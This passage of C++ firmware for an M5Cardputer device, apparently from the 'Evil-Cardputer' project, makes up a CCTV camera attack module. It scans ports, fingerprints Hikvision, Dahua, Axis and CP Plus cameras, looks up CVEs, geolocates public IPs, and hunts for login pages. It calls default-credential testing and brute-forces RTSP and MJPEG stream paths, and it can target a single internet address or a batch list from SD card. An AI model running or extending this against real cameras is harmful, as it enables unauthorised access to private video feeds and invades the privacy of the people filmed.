      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) { http.end(); return true; }
    }

    http.end();
    printCveLinks("axis");
    return true;
  }
  http.end();
  return false;
}

bool fingerprintCPPlus(IPAddress ip, uint16_t p) {
  const char* eps[] = { "/", "/index.html", "/login", "/admin", "/cgi-bin", "/api", "/config" };
  for (const char* ep : eps) {
    HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
    String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + ep;
    httpBeginAuto(http, cli, tls, url);
    int code = http.GET();
    if (code == 200) {
      String content = http.getString(); String low = content; low.toLowerCase();
      Serial.printf("   OK: %s\n", url.c_str());
      if (low.indexOf("uvr-0401e1")>=0 || low.indexOf("uvr0401e1")>=0) Serial.println("   Model: CP-UVR-0401E1-IC2");
      if (low.indexOf("cp plus")>=0 || low.indexOf("cpplus")>=0) Serial.println("   Brand: CP Plus");
      if (low.indexOf("dvr")>=0) Serial.println("   Device: DVR");
      http.end(); printCveLinks("cp plus"); return true;
    }
    http.end();
    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
  }
  return false;
}

/* Fingerprint gÃ©nÃ©rique (essaie plusieurs endpoints usuels) */
bool fingerprintGeneric(IPAddress ip, uint16_t p) {
  const char* eps[] = {
    "/System/configurationFile", "/ISAPI/System/deviceInfo",
    "/cgi-bin/magicBox.cgi?action=getSystemInfo", "/axis-cgi/admin/param.cgi?action=list",
    "/", "/index.html", "/login", "/admin", "/cgi-bin", "/api", "/config"
  };
  for (const char* ep : eps) {
    HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
    String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + ep;

    // (Optionnel) collecter quelques entÃªtes
    // const char* hdrKeys[] = {"Server","Content-Type","WWW-Authenticate"};
    // http.collectHeaders(hdrKeys, 3);

    httpBeginAuto(http, cli, tls, url);
    int code = http.GET();
    if (code == 200) {
      String txt = http.getString();
      Serial.printf("   OK: %s\n", url.c_str());

      String t = txt;
      // t += " "; t += http.header("Server");
      // t += " "; t += http.header("Content-Type");
      // t += " "; t += http.header("WWW-Authenticate");
      t.toLowerCase();

      if (t.indexOf("hikvision")>=0) { http.end(); printCveLinks("hikvision"); return true; }
      if (t.indexOf("dahua")>=0)     { http.end(); printCveLinks("dahua");     return true; }
      if (t.indexOf("axis")>=0)      { http.end(); printCveLinks("axis");      return true; }
      if (t.indexOf("cp plus")>=0 || t.indexOf("cp-plus")>=0 || t.indexOf("cpplus")>=0 || t.indexOf("cp_plus")>=0) {
        http.end(); printCveLinks("cp plus"); return true;
      }
      http.end();
      return true; // endpoint rÃ©pond quand mÃªme, utile pour logs
    }
    http.end();
    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
  }
  return false;
}

/* Fingerprint principal (appelle par marque) */
void fingerprintCamera(IPAddress ip, const std::vector<uint16_t>& ports, const String& brand) {
  uiPhase("Fingerprint & CVEs");
  Serial.printf("-- Fingerprint & CVEs --\n");
  if (brand.length()) uiAppend("Brand: " + brand);
  int cves = countCVEsForBrand(brand);
  if (cves > 0) uiAppend("Known CVEs: " + String(cves), false);

  Serial.printf("[FP] %s (%s)\n", ip.toString().c_str(), brand.c_str());
  lookupCVEs(brand);

  for (uint16_t p : ports) {
    bool done = false;
    if (brand == "Hikvision")      done = fingerprintHikvision(ip, p);
    else if (brand == "Dahua")     done = fingerprintDahua(ip, p);
    else if (brand == "Axis")      done = fingerprintAxis(ip, p);
    else if (brand == "CP Plus")   done = fingerprintCPPlus(ip, p);
    else                           done = fingerprintGeneric(ip, p);
    if (done) break;
    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
  }
}

/* ---------- RTSP helpers robustes ---------- */

bool readLineWithTimeout(WiFiClient& c, String& line, uint32_t timeout_ms = 1500) {
  uint32_t t0 = millis();
  while (!c.available() && (millis() - t0) < timeout_ms) { delay(10); }
  if (!c.available()) return false;
  line = c.readStringUntil('\n');
  line.trim();
  return true;
}

String readBodyWithTimeout(WiFiClient& c, size_t max_bytes = 2048, uint32_t timeout_ms = 300) {
  String out;
  uint32_t t0 = millis();
  while ((millis() - t0) < timeout_ms && out.length() < (int)max_bytes) {
    while (c.available() && out.length() < (int)max_bytes) {
      out += (char)c.read();
    }
    delay(4);
  }
  return out;
}

/* DÃ©tecte la prÃ©sence d'un service RTSP via OPTIONS * (RFC 2326) */
bool rtspServicePresent(IPAddress ip, uint16_t port, String* publicHeaderOut = nullptr) {
  WiFiClient client;
  if (!client.connect(ip, port, 1000)) return false;

  client.printf(
    "OPTIONS * RTSP/1.0\r\n"
    "CSeq: 1\r\n"
    "User-Agent: Evil-Cardputer\r\n"
    "\r\n"
  );

  String status;
  if (!readLineWithTimeout(client, status)) { client.stop(); return false; }
  bool ok = status.startsWith("RTSP/1.0 200");

  String line, publicLine;
  while (readLineWithTimeout(client, line)) {
    if (line.length() == 0) break;
    if (line.startsWith("Public:")) publicLine = line;
  }
  client.stop();

  if (ok && publicHeaderOut) *publicHeaderOut = publicLine;
  return ok;
}

/* DESCRIBE + vraie validation SDP (header + corps) */
bool rtspDescribe(IPAddress ip, uint16_t port, const char* path, int& codeOut, bool& sdpOut) {
  sdpOut = false; codeOut = -1;

  WiFiClient client;
  if (!client.connect(ip, port, 1000)) return false;

  String url = "rtsp://" + ip.toString() + ":" + String(port) + String(path);
  client.printf(
    "DESCRIBE %s RTSP/1.0\r\n"
    "CSeq: 2\r\n"
    "User-Agent: Evil-Cardputer\r\n"
    "Accept: application/sdp\r\n"
    "\r\n", url.c_str()
  );

  String status;
  if (!readLineWithTimeout(client, status)) { client.stop(); return false; }

  if (status.startsWith("RTSP/1.0 ")) {
    int sp = status.indexOf(' ');
    int sp2 = status.indexOf(' ', sp + 1);
    if (sp >= 0 && sp2 > sp) codeOut = status.substring(sp + 1, sp2).toInt();
  }

  // Lire headers
  String line, ct; int cl = -1;
  while (readLineWithTimeout(client, line)) {
    if (line.length() == 0) break;
    String low = line; low.toLowerCase();
    if (low.startsWith("content-type:")) ct = low;
    if (low.startsWith("content-length:")) cl = line.substring(line.indexOf(':')+1).toInt();
  }

  // Lire un bout du corps et valider grammaire SDP
  String body = readBodyWithTimeout(client, 2048, 600);
  client.stop();

  bool headerSdp = (ct.indexOf("application/sdp") >= 0 || ct.endsWith("/sdp"));
  bool looksSdp  = (body.indexOf("v=0") >= 0) && (body.indexOf("m=video") >= 0);
  if (headerSdp && looksSdp) sdpOut = true;

  return (codeOut > 0);
}

// Renvoie un nom de marque "propre" Ã  partir du header RTSP "Server:"
String normalizeRtspBrandFromServer(const String& srvRaw) {
  String s = srvRaw; s.trim();
  String low = s; low.toLowerCase();

  if (low.indexOf("hipcam")        >= 0) return "Hipcam";
  if (low.indexOf("tvt")           >= 0) return "TVT";
  if (low.indexOf("ubnt")          >= 0 || low.indexOf("ubiquiti") >= 0) return "Ubiquiti";
  if (low.indexOf("gstreamer")     >= 0) return "GStreamer";
  if (low.indexOf("h264dvr")       >= 0) return "H264DVR";
  if (low.indexOf("rtprtspflyer")  >= 0) return "RtpRtspFlyer";
  if (low.indexOf("rtsp server")   >= 0 || low.indexOf("rtsp") >= 0) return "RTSP";

  // fallback: renvoie tel quel si on ne connaÃ®t pas
  return s.length() ? s : "RTSP";
}

bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut) {
  uiPhase("Detecting camera");
    Serial.printf("-- Starting Camera Detection --\n");

  // Liste des serveurs RTSP connus
  const char* rtspServerNames[] = {
    "H264DVR",
    "Hipcam RealServer",
    "TVT RTSP Server",
    "GStreamer RTSP server",
    "UBNT Streaming Server",
    "RtpRtspFlyer",
    "RTSP Server"
  };

  // Liste des commandes RTSP suffisantes pour considÃ©rer que c'est une camÃ©ra
  const char* rtspCommands[] = {
    "OPTIONS", "DESCRIBE", "PLAY", "PAUSE",
    "SETUP", "TEARDOWN", "SET_PARAMETER", "GET_PARAMETER"
  };

  // 1) DÃ©tection via HTTP
  for (uint16_t p : ports) {
    String server, body;
    if (httpRequest(ip, p, "/", server, body)) {
      String lowServer = server; lowServer.toLowerCase();
      String lowBody   = body;   lowBody.toLowerCase();

      if (server.length()) {
        Serial.printf("[FP] HTTP Server header from %s:%u â†’ %s\n", ip.toString().c_str(), p, server.c_str());
        logScanResult("[SERVER] HTTP " + ip.toString() + ":" + String(p) + " " + server);
      }

      if (headerContainsAny(lowServer, brandKeys_hikvision, sizeof(brandKeys_hikvision)/sizeof(brandKeys_hikvision[0]))) { brandOut = "Hikvision"; return true; }
      if (headerContainsAny(lowServer, brandKeys_dahua,     sizeof(brandKeys_dahua)/sizeof(brandKeys_dahua[0])))         { brandOut = "Dahua";     return true; }
      if (headerContainsAny(lowServer, brandKeys_axis,      sizeof(brandKeys_axis)/sizeof(brandKeys_axis[0])))          { brandOut = "Axis";      return true; }
      if (headerContainsAny(lowServer, brandKeys_sony,      sizeof(brandKeys_sony)/sizeof(brandKeys_sony[0])))          { brandOut = "Sony";      return true; }
      if (headerContainsAny(lowServer, brandKeys_bosch,     sizeof(brandKeys_bosch)/sizeof(brandKeys_bosch[0])))        { brandOut = "Bosch";     return true; }
      if (headerContainsAny(lowServer, brandKeys_samsung,   sizeof(brandKeys_samsung)/sizeof(brandKeys_samsung[0])))    { brandOut = "Samsung";   return true; }
      if (headerContainsAny(lowServer, brandKeys_panasonic, sizeof(brandKeys_panasonic)/sizeof(brandKeys_panasonic[0]))) { brandOut = "Panasonic"; return true; }
      if (headerContainsAny(lowServer, brandKeys_vivotek,   sizeof(brandKeys_vivotek)/sizeof(brandKeys_vivotek[0])))    { brandOut = "Vivotek";   return true; }

      if (lowBody.indexOf("cp plus")>=0 || lowBody.indexOf("cp-plus")>=0 || lowBody.indexOf("cpplus")>=0) {
        brandOut = "CP Plus"; return true;
      }

      if (headerContainsAny(lowServer, brandKeys_generic, sizeof(brandKeys_generic)/sizeof(brandKeys_generic[0])) ||
          lowBody.indexOf("camera")>=0 || lowBody.indexOf("webcam")>=0 ||
          lowBody.indexOf("surveillance")>=0 || lowBody.indexOf("stream")>=0 || lowBody.indexOf("video")>=0) {
        brandOut = "Unknown cam"; return true;
      }
    }

    // 2) DÃ©tection via RTSP
    if (p == 554 || p == 8554 || p == 10554 || p == 1554 || p == 2554 ||
        p == 3554 || p == 4554 || p == 5554 || p == 6554 || p == 7554 || p == 9554) {

      WiFiClient rtspCli;
      if (rtspCli.connect(ip, p)) {
        rtspCli.printf("OPTIONS rtsp://%s:%u/ RTSP/1.0\r\nCSeq: 1\r\n\r\n", ip.toString().c_str(), p);
        unsigned long start = millis();
        while (rtspCli.connected() && millis() - start < 500) {
          while (rtspCli.available()) {
            String line = rtspCli.readStringUntil('\n');
            line.trim();

            // DÃ©tection Server:
            if (line.startsWith("Server:") || line.startsWith("server:")) {
              String srv = line.substring(line.indexOf(':') + 1);
              srv.trim();

              // Log la valeur brute du header Server:
              Serial.printf("[FP] RTSP Server header from %s:%u â†’ %s\n", ip.toString().c_str(), p, srv.c_str());
              logScanResult("[SERVER] RTSP " + ip.toString() + ":" + String(p) + " " + srv);

              // VÃ©rification des patterns connus
              String srvLow = srv; srvLow.toLowerCase();
              bool matched = false;
              const char* matchedPattern = nullptr;

              for (size_t i = 0; i < sizeof(rtspServerNames)/sizeof(rtspServerNames[0]); ++i) {
                String ref = rtspServerNames[i]; ref.toLowerCase();
                if (srvLow.indexOf(ref) >= 0) {
                  matched = true;
                  matchedPattern = rtspServerNames[i];
                  break;
                }
              }
              if (!matched && srvLow.indexOf("rtsp") >= 0) {
                matched = true;
                matchedPattern = "*rtsp*";
              }

              if (matched) {
                String norm = normalizeRtspBrandFromServer(srv);
                brandOut = norm;                       // <<â€”â€” donne â€œHipcamâ€, â€œTVTâ€, â€œUbiquitiâ€, etc.
                uiAppend("Type: " + srv);             // affichage cohÃ©rent
                Serial.printf("[BRAND] RTSP brand â†’ %s\n", norm.c_str());
                logScanResult("[BRAND] " + norm);
                rtspCli.stop();
                return true;
              }

            }

            // DÃ©tection Public:
            if (line.startsWith("Public:") || line.startsWith("public:")) {
              String pub = line.substring(line.indexOf(':') + 1);
              pub.trim();
              Serial.printf("[FP] RTSP Public from %s:%u â†’ %s\n", ip.toString().c_str(), p, pub.c_str());

              String pubLow = pub; pubLow.toLowerCase();
              for (size_t i = 0; i < sizeof(rtspCommands)/sizeof(rtspCommands[0]); ++i) {
                String cmd = rtspCommands[i]; cmd.toLowerCase();
                if (pubLow.indexOf(cmd) >= 0) {
                  Serial.printf("[MATCH] RTSP Public contains '%s' at %s:%u\n", rtspCommands[i], ip.toString().c_str(), p);
                  logScanResult("[RTSP-PUBLIC] " + ip.toString() + ":" + String(p) +
                                " contains " + rtspCommands[i]);
                  uiAppend("Type: Camera (RTSP Public: " + String(rtspCommands[i]) + ")");
                  brandOut = "RTSP Camera";
                  rtspCli.stop();
                  return true;
                }
              }
            }
          }
        }
        rtspCli.stop();
      }
    }

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
  }

  return false;
}


// Fonction pour identifier si le port est susceptible de servir un site web
bool isHttpLikePort(uint16_t p) {
  // ports explicitement NON-HTTP
  switch (p) {
    // RTSP
    case 554: case 8554: case 10554: case 1554: case 2554:
    case 3554: case 4554: case 5554: case 6554: case 7554: case 9554:
      return false;

    // RTMP
    case 1935: case 1936: case 1937: case 1938: case 1939:
      return false;

    // ONVIF discovery (UDP) + DVR propriÃ©taires
    case 3702: case 37777:
      return false;
  }

  // tous les autres (web/http-like) â†’ on garde
  return true;
}

/* ---------- RTSP helpers: path alÃ©atoire pour anti faux-positifs ---------- */
String makeRandomInvalidRtspPath() {
  // gÃ©nÃ¨re un chemin invalide style "/A1B2C3D4"
  uint32_t r = (uint32_t)(millis() ^ random(0x7fffffff));
  char buf[16];
  snprintf(buf, sizeof(buf), "/%08lx", (unsigned long)r);
  return String(buf);
}

bool fileContainsToken(const char* path, const String& token) {
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  bool found = false;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    if (line.indexOf(token) >= 0) { found = true; break; }
  }
  f.close();
  return found;
}

void ensureCCTVDir() {
  if (!SD.exists("/evil/CCTV")) SD.mkdir("/evil/CCTV");
  if (!SD.exists(LIVE_LIST_PATH)) {
    File f = SD.open(LIVE_LIST_PATH, FILE_WRITE);
    if (f) { f.println("# name | url"); f.close(); }
  }
}


void uiText(int x, int y, const char* s, uint32_t fg = TFT_WHITE, uint32_t bg = TFT_BLACK) {
  M5.Display.setTextColor(fg, bg);
  M5.Display.setCursor(x, y);
  M5.Display.print(s);
}

void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
  uiPhase("Checking streams");
  Serial.printf("-- Starting Check Streams --\n");

  // Chemins RTSP plausibles (rÃ©duits pour limiter le bruit)
  static const char* rtspPaths[] = {
    "/live", "/live.sdp", "/h264", "/h264.sdp", "/mpeg4",
    "/stream1", "/stream2", "/main", "/sub",
    "/1", "/ch0_0.264",
    "/Streaming/Channels/1", "/Streaming/Channels/101",
    "/onvif/streaming/channels/1",
    "/axis-media/media.amp",
    "/cam/realmonitor?channel=1&subtype=0"
  };

  // Chemins HTTP indicatifs (mjpeg/snapshot/etc.)
  static const char* httpStreamPaths[] = {
    // Axis
    "/axis-cgi/mjpg/video.cgi",
  
    // Foscam / D-Link / EasyN
    "/mjpeg.cgi",
    "/video/mjpg.cgi",
    "/videostream.cgi",
  
    // Edimax / Intellinet / TP-Link / Trendnet / Vivotek
    "/mjpg/video.mjpg",
    "/jpg/image.jpg",
    "/snapshot.cgi",
    "/image.jpg",
    "/cgi-bin/video.jpg",
    "/cgi-bin/viewer/video.jpg",
  
    // Panasonic
    "/SnapshotJPEG",
    "/cgi-bin/nphMotionJpeg",
  
    // Mobotix
    "/faststream.jpg",
    "/control/faststream.jpg",
  
    // GÃ©nÃ©riques
    "/video",
    "/stream",
    "/stream.jpg",
    "/video.jpg",
    "/liveimg.cgi",
    "/now.jpg",
    "/image",
    "/oneshotimage.jpg",
  
    // ONVIF (services, non MJPEG mais utile)
    "/onvif/device_service",
    "/onvif/streaming"
  };


  int rtmpOk = 0;
  std::vector<String> rtspFound;      // pour sauvegarde SD
  std::vector<String> rtspProtected;  // 401 â†’ utile Ã  lâ€™audit

  // 1) RTSP : OPTIONS * puis DESCRIBE (avec anti faux-positifs)
  for (uint16_t p : ports) {
    bool isRtspPort = (p == 554 || p == 8554 || p == 10554 || p == 1554 || p == 2554 ||
                       p == 3554 || p == 4554 || p == 5554 || p == 6554 || p == 7554 || p == 9554);
    if (!isRtspPort) continue;

    String publicHdr;
    if (rtspServicePresent(ip, p, &publicHdr)) {
      
      // Serial existant
      Serial.printf("[RTSP] service present at %s:%u  %s\n", ip.toString().c_str(), p, publicHdr.length() ? publicHdr.c_str() : "");
      logScanResult("[RTSP] service " + ip.toString() + ":" + String(p));
      
      // Ã‰cran (mÃªme style)
      uiAppend(String("[RTSP] service: ") + ip.toString() + ":" + String(p));
      uiAppend(publicHdr.length() ? (publicHdr) : "");
      uiAppend(" ");
      
      // Anti faux-positifs : tester un chemin alÃ©atoire incohÃ©rent
      String garbage = makeRandomInvalidRtspPath();
      int garbageCode = -1; bool garbageSdp = false;
      if (rtspDescribe(ip, p, garbage.c_str(), garbageCode, garbageSdp) && garbageCode == 200 && garbageSdp) {
        
        // Random path renvoie 200 (SDP) â†’ faux positif probable
        Serial.printf("[?] RTSP %s:%u%s -> 200 (SDP) on random path â†’ check root / false positive likely\n", ip.toString().c_str(), p, garbage.c_str());
        uiAppend("rtsp://" + String(ip.toString() + ":" + String(p) + garbage + " (200)"));
        String genericRtsp = "rtsp://" + ip.toString() + ":" + String(p) + "/";
        bool already = false;
        for (const auto& u : rtspFound) { if (u == genericRtsp) { already = true; break; } }
        if (!already) {
          rtspFound.push_back(genericRtsp);
          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + "/ 200/SDP");
          uiAppend("rtsp://" + ip.toString() + ":" + String(p) + "/ -> 200 !");
          rtspFound.push_back("rtsp://" + ip.toString() + ":" + String(p) + "/");
        }
        if (g_scanFromSD) {
          Serial.println("[RTSP] SD mode â†’ auto-skip known paths (no popup).");
          logScanResult("[RTSP] rtsp://" + ip.toString() + ":" + String(p) + "/");
          goto AFTER_RTSP_PORT_SCAN;
        } else {
          // Interactif : proposer de continuer le crawl ou pas
          bool go = confirmPopup("Random path returned 200\nFalse positive likely\nContinue crawling?");
          if (!go) {
            uiRefresh();
            Serial.println("[RTSP] Known-paths scan canceled by user (anti false-positive).");
            logScanResult("[RTSP] rtsp://" + ip.toString() + ":" + String(p) + "/");
            goto AFTER_RTSP_PORT_SCAN;
          }
        }
      }

      // Tenter des DESCRIBE sur plusieurs chemins connus
      for (const char* path : rtspPaths) {
        int code = -1; bool sdp = false;
        if (!rtspDescribe(ip, p, path, code, sdp)) continue;
        Serial.printf("[TEST] rtsp://%s:%u%s\n",ip.toString().c_str(), p, path);

        if (code == 200 && sdp) {
          // Serial + log
          Serial.printf("[ðŸŽ¥] RTSP %s:%u%s -> 200 (SDP)\n",
                        ip.toString().c_str(), p, path);
          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + path + " 200/SDP");
          // Ã‰cran + SD (liste)
          uiAppend("rtsp://" + ip.toString() + ":" + String(p) + path + " -> 200");
          rtspFound.push_back("rtsp://" + ip.toString() + ":" + String(p) + String(path));
        } else if (code == 401) {
          Serial.printf("[ðŸ”] RTSP %s:%u%s -> 401 (auth required)\n",
                        ip.toString().c_str(), p, path);
          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + path + " 401");
          uiAppend(ip.toString() + ":" + String(p) + path + " -> 401 (auth required)");
          rtspProtected.push_back("rtsp://" + ip.toString() + ":" + String(p) + String(path) + "  [401]");
        } else if (code > 0) {
          Serial.printf("[â„¹] RTSP %s:%u%s -> %d\n", ip.toString().c_str(), p, path, code);
        }

        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
      }
    }
AFTER_RTSP_PORT_SCAN:
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
  }

  for (uint16_t p : ports) {
    for (const char* path : httpStreamPaths) {
      HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
  
      String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;
      httpBeginAuto(http, cli, tls, url);
  
      // ðŸ‘‰ IMPORTANT: collecter les headers que tu veux pouvoir lire ensuite
      static const char* wantedHdrs[] = {
        "Content-Type", "Content-Length", "Transfer-Encoding",
        "WWW-Authenticate", "Server", "Cache-Control", "Pragma", "Expires", "Connection"
      };
      http.collectHeaders(wantedHdrs, sizeof(wantedHdrs)/sizeof(wantedHdrs[0]));
  
      // Optionnel: amÃ©liorer la nÃ©go cÃ´tÃ© firmware Axis
      http.addHeader("Accept", "multipart/x-mixed-replace,image/jpeg,*/*");
  
      int code = http.sendRequest("GET");
      Serial.printf("[TEST] %s (HTTP %d)\n", url.c_str(), code);
  
      if (code == 200) {
        String ct = http.header("Content-Type");
        if (ct.length() == 0) {
          // --\n-- Fallback: lire lâ€™entÃªte brut depuis le flux TCP
          WiFiClient* s = http.getStreamPtr();
          s->setTimeout(1000);
          String raw;
          Serial.println(F("===== RAW HTTP HEADERS ====="));
          while (s->connected()) {
            String line = s->readStringUntil('\n');
            if (line == "\r" || line.length() == 0) break; // fin des headers
            raw += line; raw += '\n';
            Serial.print(line);
          }
          Serial.println(F("===== END HEADERS ====="));
          // extraire Content-Type Ã  la main (trÃ¨s simple, case-insensitive)
          int pos = raw.indexOf("Content-Type:");
          if (pos < 0) pos = raw.indexOf("content-type:");
          if (pos >= 0) {
            int eol = raw.indexOf('\n', pos);
            ct = raw.substring(pos + 13, eol);
            ct.trim();
          }
        }
  
        String lct = ct; lct.toLowerCase();
  
        bool looksVideo = false;
        for (size_t i = 0; i < NB_CT; i++) {
          const char* sig = reinterpret_cast<const char*>(pgm_read_ptr(&camContentTypes[i]));
          if (lct.indexOf(sig) >= 0) {
            Serial.print(F("[MATCH] signature: ")); Serial.println(sig);
            looksVideo = true;
            break;
          } else {
            Serial.print(F("[NO MATCH] ")); Serial.println(sig);
          }
        }
  
        // Plan B: si Content-Type absent/incorrect, dÃ©tecter la boundary dans le corps
        if (!looksVideo) {
          WiFiClient* s = http.getStreamPtr();
          unsigned long t0 = millis();
          String firstKB;
          while (s->available() == 0 && (millis() - t0) < 1000) delay(10);
          while (s->available() && firstKB.length() < 2048) {
            firstKB += char(s->read());
          }
          if (firstKB.startsWith("--") && firstKB.indexOf("Content-Type:") > 0) {
            looksVideo = true;
            if (ct.length() == 0) ct = F("multipart/x-mixed-replace (inferred)");
          }
        }
  
        // --- LOG + comptage
        Serial.print(F("Content-Type: ")); Serial.println(ct);
        Serial.print(F("Video signature detected: "));
        Serial.println(looksVideo ? F("YES") : F("NO"));
  
        if (looksVideo) {
          appendMjpegToLiveList(ip, p, path);
          Serial.printf("[ðŸŽ¥] %s  (%s)\n", url.c_str(), ct.c_str());
          logScanResult("[STREAM] " + url + " (" + ct + ")");
          httpOk++;
        }
      } else if (code == 400) {
        Serial.printf("[x] %s  (400 Bad Request)\n", url.c_str());
        logScanResult("[400] " + url);
        http.end();
        M5.Display.fillRect(0, 0, M5.Display.height(), 10, TFT_BLACK);
        uiText(2, 0, "400 Bad Request", TFT_RED);
        delay(1000);
        return;
      }
  
      http.end();
      M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
          M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
    }
  }



  // 3) RTMP : indicatif (ouvert/fermÃ©)
  for (uint16_t p : ports) {
    if (p == 1935 || p == 1936 || p == 1937 || p == 1938 || p == 1939) {
      if (isPortOpen(ip, p, 250)) {
        Serial.printf("[ðŸ“¡] RTMP TCP open at %s:%u (manual test recommended)\n", ip.toString().c_str(), p);
        logScanResult("[RTMP] " + ip.toString() + ":" + String(p));
        rtmpOk++;
      }
    }
  }

  // â€”â€” RÃ©sumÃ© UI concis
  uiAppend("Streams: RTSP " + String(rtspFound.size()) +
           "  HTTP " + String(httpOk) +
           "  RTMP " + String(rtmpOk));
           
  Serial.printf("Streams: RTSP %u  HTTP %u  RTMP %u\n",
          (unsigned)rtspFound.size(),
          (unsigned)httpOk,
          (unsigned)rtmpOk);

  // â€”â€” Sauvegarde dans le rapport (fichier SD via uiEndHostAndSave)
  if (!rtspFound.empty()) {
    uiReportOnly("RTSP accessible paths:");
    for (const String& u : rtspFound) uiReportOnly("  - " + u);
  } else {
    uiReportOnly("RTSP accessible paths: none");
  }

  if (!rtspProtected.empty()) {
    uiReportOnly("RTSP protected (auth required):");
    for (const String& u : rtspProtected) uiReportOnly("  - " + u);
  }
  httpOk == 0;
  delay(2000);
}



void showIpInfo(const String& publicIp) {
  if (publicIp.startsWith("10.") || publicIp.startsWith("192.168.")) return; // privÃ©
  WiFiClientSecure tls;
  tls.setInsecure();
  HTTPClient http;
  http.setTimeout(3000);
  http.begin(tls, "https://ipinfo.io/" + publicIp + "/json");
  int code = http.GET();
  if (code == 200) {
    DynamicJsonDocument doc(768);
    deserializeJson(doc, http.getString());
    const char* city    = doc["city"]    | "?";
    const char* country = doc["country"] | "?";
    Serial.printf("[ðŸŒ] City: %s  Country: %s\n", city, country);
    if (doc["loc"]) {
      String loc = doc["loc"].as<String>(); // lat,lon
      Serial.printf("     Maps: https://www.google.com/maps?q=%s\n", loc.c_str());
      uiAppend("Geo: " + String(city) + ", " + String(country));
    } else {
      uiAppend("Geo: " + String(city) + ", " + String(country));
    }
  }
  http.end();
}



void processCCTVHost(const IPAddress& ip) {
  uiBeginHost(ip);
  Serial.printf("-------------------------------------------------\n[NEW] Testing %s\n---\n", ip.toString().c_str());

  // Geo (only for public IPs)
  uiPhase("OSINT / GeoIP");
  Serial.printf("-- OSINT / GeoIP --\n");
  showIpInfo(ip.toString());

  // 1) Ports
  auto openPorts = scanCameraPorts(ip);
  if (openPorts.empty()) {
    Serial.printf("[INFO] No camera ports open on %s\n", ip.toString().c_str());
    uiAppend("No camera ports open");
    uiEndHostAndSave();
    return;
  }

  // 2) Brand
  String brand;
  if (!isCamera(ip, openPorts, brand)) {
    Serial.printf("[INFO] %s : not seem to be a camera (heuristics)\n", ip.toString().c_str());
    uiAppend("Heuristics: not a camera?", false);
  }

  // Header line on TFT (small, concise)
  M5.Display.setTextSize(1);
  uiAppend("Targeting " + ip.toString() + " -> " + (brand.length()?brand:"(unknown)"), false);

  // 3) Fingerprint + CVE
  fingerprintCamera(ip, openPorts, brand);

  // 4) Login pages
  findLoginPages(ip, openPorts);

  // 5) Default creds
  testDefaultCreds(ip, openPorts);

  // 6) Streams
  detectStreams(ip, openPorts);

  // Save summary to SD
  uiEndHostAndSave();
}


/* ---------- Mode: scan local (LAN) ---------- */
void scanCCTVCamerasLocal() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return; // retour au menu principal
  }
  local_scan_CCTV();   // Remplit hostslistCCTV par ARP
  std::vector<IPAddress> hosts = hostslistCCTV;

  if (hosts.empty()) {
    waitAndReturnToMenu("No hosts to scan");
    return;
  }

  for (const IPAddress& ip : hosts) {
    processCCTVHost(ip);
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break; // retour menu
  }
  waitAndReturnToMenu("CCTV scan done");
}

/* ---------- Mode: IP unique (WAN) ---------- */
void scanCCTVCamerasSingleIP() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  IPAddress target;
  if (!promptIPv4(target)) {
    waitAndReturnToMenu("Operation canceled");
    return;
  }

  // ExÃ©cuter le mÃªme pipeline que pour un hÃ´te LAN
  processCCTVHost(target);
  waitAndReturnToMenu("CCTV scan (single IP) done");
}


constexpr const char* CCTV_FILE = "/evil/CCTV/CCTV_IP.txt";

bool loadIPsFromSD(const char* path, std::vector<IPAddress>& out) {
  out.clear();
  File f = SD.open(path, FILE_READ);
  if (!f) {
    Serial.printf("[!] File not found: %s\n", path);
    return false;
  }
  int total = 0, ok = 0, bad = 0;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();                 // supprime \r, espaces
    if (line.length() == 0) { ++total; continue; }
    IPAddress ip;
    if (ip.fromString(line)) {
      out.push_back(ip);
      ++ok;
    } else {
      ++bad;
      Serial.printf("[WARN] Ignoring invalid IP in file: %s\n", line.c_str());
    }
    ++total;
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
  }
  f.close();
  Serial.printf("[INFO] Loaded %d IP(s) from %s (%d invalid)\n", ok, path, bad);
  return !out.empty();
}

void scanCCTVCamerasFromFile() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5, 5);
  M5.Display.println("Loading IPs from SDâ€¦");
  M5.Display.println(CCTV_FILE);
  M5.Display.display();

  std::vector<IPAddress> list;
  if (!loadIPsFromSD(CCTV_FILE, list)) {
    waitAndReturnToMenu("No IPs / file missing");
    return;
  }

  // --- NEW: activer mode SD (batch) ---
